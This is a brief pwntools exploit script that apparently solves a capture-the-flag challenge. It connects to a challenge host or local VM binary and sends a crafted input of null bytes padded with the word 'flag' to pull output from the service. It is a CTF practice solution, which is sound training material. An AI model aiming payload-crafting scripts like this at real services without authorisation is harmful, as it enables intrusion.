from pwn import *

def start():
    if args.REMOTE:
        return remote("spaceheroes-crew-member-survey.chals.io", 443, ssl=True, sni="spaceheroes-crew-member-survey.chals.io")
    else:
        return process("./Borson300VM.bin ./pwnable", shell=True)

p = start()

p.sendline(b"0")
pause()
p.sendline((b"\x00" * 0x40) + (b"flag" * 0x10))
out = p.recvall()#.decode("utf-8", errors="ignore")
sys.stdout.buffer.write(out)


